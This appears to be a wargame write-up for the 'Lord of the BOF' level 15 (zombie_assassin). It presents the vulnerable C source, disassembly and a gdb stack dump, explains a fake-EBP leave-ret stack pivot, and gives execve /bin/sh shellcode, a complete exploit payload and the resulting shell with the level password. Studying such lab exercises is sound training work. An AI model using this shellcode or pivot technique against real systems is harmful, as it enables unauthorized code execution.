# Level 15, Assassin -> Zombie-Assassin

### zombie_assassin.c

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - zombie_assassin
        - FEBP
*/

#include <stdio.h>
#include <stdlib.h>

main(int argc, char *argv[])
{
        char buffer[40];

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        if(argv[1][47] == '\xbf')
        {
                printf("stack retbayed you!\n");
                exit(0);
        }

        if(argv[1][47] == '\x40')
        {
                printf("library retbayed you, too!!\n");
                exit(0);
        }

        // strncpy instead of strcpy!
        strncpy(buffer, argv[1], 48);
        printf("%s\n", buffer);
}
```

### Analysis

#### Disassembling the "zombie_assassin"

```
Dump of assembler code for function main:
0x8048440 <main>:       push   %ebp
0x8048441 <main+1>:     mov    %ebp,%esp
0x8048443 <main+3>:     sub    %esp,40
0x8048446 <main+6>:     cmp    DWORD PTR [%ebp+8],1
0x804844a <main+10>:    jg     0x8048463 <main+35>
0x804844c <main+12>:    push   0x8048540
0x8048451 <main+17>:    call   0x8048354 <printf>
0x8048456 <main+22>:    add    %esp,4
0x8048459 <main+25>:    push   0
0x804845b <main+27>:    call   0x8048364 <exit>
0x8048460 <main+32>:    add    %esp,4
0x8048463 <main+35>:    mov    %eax,DWORD PTR [%ebp+12]
0x8048466 <main+38>:    add    %eax,4
0x8048469 <main+41>:    mov    %edx,DWORD PTR [%eax]
0x804846b <main+43>:    add    %edx,47
0x804846e <main+46>:    cmp    BYTE PTR [%edx],0xbf
0x8048471 <main+49>:    jne    0x8048490 <main+80>
0x8048473 <main+51>:    push   0x804854c
0x8048478 <main+56>:    call   0x8048354 <printf>
0x804847d <main+61>:    add    %esp,4
0x8048480 <main+64>:    push   0
0x8048482 <main+66>:    call   0x8048364 <exit>
0x8048487 <main+71>:    add    %esp,4
0x804848a <main+74>:    lea    %esi,[%esi]
0x8048490 <main+80>:    mov    %eax,DWORD PTR [%ebp+12]
0x8048493 <main+83>:    add    %eax,4
0x8048496 <main+86>:    mov    %edx,DWORD PTR [%eax]
0x8048498 <main+88>:    add    %edx,47
0x804849b <main+91>:    cmp    BYTE PTR [%edx],0x40
0x804849e <main+94>:    jne    0x80484b7 <main+119>
0x80484a0 <main+96>:    push   0x8048561
0x80484a5 <main+101>:   call   0x8048354 <printf>
0x80484aa <main+106>:   add    %esp,4
0x80484ad <main+109>:   push   0
0x80484af <main+111>:   call   0x8048364 <exit>
0x80484b4 <main+116>:   add    %esp,4
0x80484b7 <main+119>:   push   48
0x80484b9 <main+121>:   mov    %eax,DWORD PTR [%ebp+12]
0x80484bc <main+124>:   add    %eax,4
0x80484bf <main+127>:   mov    %edx,DWORD PTR [%eax]
0x80484c1 <main+129>:   push   %edx
0x80484c2 <main+130>:   lea    %eax,[%ebp-40]
0x80484c5 <main+133>:   push   %eax
0x80484c6 <main+134>:   call   0x8048374 <strncpy>
0x80484cb <main+139>:   add    %esp,12
0x80484ce <main+142>:   lea    %eax,[%ebp-40]
0x80484d1 <main+145>:   push   %eax
0x80484d2 <main+146>:   push   0x804857e
0x80484d7 <main+151>:   call   0x8048354 <printf>
0x80484dc <main+156>:   add    %esp,8
0x80484df <main+159>:   leave
0x80484e0 <main+160>:   ret
```

#### Estimated Stack Structure

```sh
|  char buffer[40]      | [%ebp-40]
|  SFP                  | [%ebp]
|  RET                  | [%ebp+4]
|  ARGC                 | [%ebp+8]
|  Pointer to ARGV[0]   | [%ebp+C]
```

#### Observed Stack Structure (bp at *main+142)

```
(gdb) run `python -c "print 'A'*40"`
Starting program: /home/assassin/zombie_assassin-cp `python -c "print 'A'*40"`

Breakpoint 1, 0x80484ce in main ()
(gdb) x/100x $esp
0xbffffaa0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffab0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffac0:     0x41414141      0x41414141      0x00000000      0x00000000
0xbffffad0:     0x00000002      0xbffffb14      0xbffffb20      0x40013868
0xbffffae0:     0x00000002      0x08048390      0x00000000      0x080483b1
0xbffffaf0:     0x08048440      0x00000002      0xbffffb14      0x080482e4
0xbffffb00:     0x0804851c      0x4000ae60      0xbffffb0c      0x40013e90
0xbffffb10:     0x00000002      0xbffffc10      0xbffffc32      0x00000000
0xbffffb20:     0xbffffc5b      0xbffffc6e      0xbffffc87      0xbffffca6
0xbffffb30:     0xbffffcc8      0xbffffcd6      0xbffffe99      0xbffffeb8
0xbffffb40:     0xbffffed6      0xbffffeeb      0xbfffff0b      0xbfffff16
0xbffffb50:     0xbfffff27      0xbfffff2f      0xbfffff40      0xbfffff4a
0xbffffb60:     0xbfffff58      0xbfffff69      0xbfffff77      0xbfffff82
0xbffffb70:     0xbfffff96      0x00000000      0x00000003      0x08048034
0xbffffb80:     0x00000004      0x00000020      0x00000005      0x00000006
0xbffffb90:     0x00000006      0x00001000      0x00000007      0x40000000
0xbffffba0:     0x00000008      0x00000000      0x00000009      0x08048390
0xbffffbb0:     0x0000000b      0x00000203      0x0000000c      0x00000203
0xbffffbc0:     0x0000000d      0x00000203      0x0000000e      0x00000203
0xbffffbd0:     0x00000010      0x0fabfbff      0x0000000f      0xbffffc0b
0xbffffbe0:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffbf0:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffc00:     0x00000000      0x00000000      0x69000000      0x00363836
0xbffffc10:     0x6d6f682f      0x73612f65      0x73736173      0x7a2f6e69
0xbffffc20:     0x69626d6f      0x73615f65      0x73736173      0x632d6e69
```

### Exploit

#### How to pwn

Fake EBP

Return Address 위? 아래에 있는 `SFP` 값을 조작해 `eip`를 조작한다! Return Address에 `leave-ret` 명령어 주소를 넣고, SFP에 (쉘코드 주소+4) 값을 넣는다. 이렇게 되면 함수 에필로그 과정에서 신기한 일이 생긴다.

`leave` 명령어는 함수 에필로그를 간략화한 명령어서, `mov esp, ebp`와 `pop ebp`를 동시에 수행하게 된다. 그리고 `ret` 명령어는 스택 프레임 해제를 간략화한 명령어로, `pop eip`와 `jmp eip`를 수행하게 된다. `leave`를 수행하면 SFP에 저장되어 있는 값이 `ebp`로 들어가게 되며 이전 스택 프레임이 복원 되게 된다. 

이때 만약 `SFP`에 (쉘코드 주소+4) 값이 들어가게 되면 `mov esp, ebp`를 했을때 스택이 이렇게 구성된다.

```sh
|  &shellcode               |   
|  char shellcode[40]       |
|  SFP (= &(shellcode+4) )  |   <- EBP, ESP
|  RET                      |
|  ARGC                     |
|  Pointer to ARGV[0]       |
```

`pop ebp`를 수행하면 다음과 같다.

```sh
|  &shellcode               |   <- EBP
|  char shellcode[40]       |
|  SFP (= &(shellcode+4) )  |   
|  RET                      |   <- ESP
|  ARGC                     |
|  Pointer to ARGV[0]       |
```

정상적인 루틴은 이후에 `ret` 명령어를 수행해 ESP가 가르키느 값에서 Return Address값을 가져오고 점프를 하게 된다. 그러나 여기에 `leave-ret` 명령어 주소를 넣게 되면 `leave` 명령어을 한번 더 수행하게 된다. 

`mov esp, ebp`를 수행하면 조작된 EBP 값이 ESP로 들어가게 되며 EBP와 ESP가 가르키는 주소가 같아진다.

```sh
|  &shellcode               |   <- EBP, ESP
|  char shellcode[40]       |
|  SFP (= &(shellcode+4) )  |   
|  RET                      |   
|  ARGC                     |
|  Pointer to ARGV[0]       |
```

`pop ebp`를 하면 `ESP`와 `EBP`가 같이 가르키고 있는 `*(shellcode+4)`값이 들어간다. 그리고 `ESP`는 자동으로 4만큼 줄어든다. 그러면 스택은 다음과 같이 구성된다.

```sh
|  &shellcode               |   
|  char shellcode[40]       |   <- ESP
|  SFP (= &(shellcode+4) )  |   
|  RET                      |   
|  ARGC                     |
|  Pointer to ARGV[0]       |
```

이 상황에서 `ret` 명령어를 수행하게 되면 귀신같이 쉘코드로 실행흐름이 넘어오게 된다.

#### Shellcode (24 bytes)

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```

#### Final Payload

```
./zombie_assassin `python -c "print '\xa4\xfa\xff\xbf'+'\x90'*12+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'+'\x9c\xfa\xff\xbf'+'\xdf\x84\x04\x08'"`
```

### Result

```
[assassin@localhost assassin]$ ./zombie_assassin `python -c "print '\xa4\xfa\xff\xbf'+'\x90'*12+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'+'\x9c\xfa\xff\xbf'+'\xdf\x84\x04\x08'"`
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒Ph//shh/bin▒▒PS▒ᙰ
                                   ̀▒▒▒▒߄
bash$ id
uid=515(assassin) gid=515(assassin) euid=516(zombie_assassin) egid=516(zombie_assassin) groups=515(assassin)
bash$ my-pass
euid = 516
no place to hide
```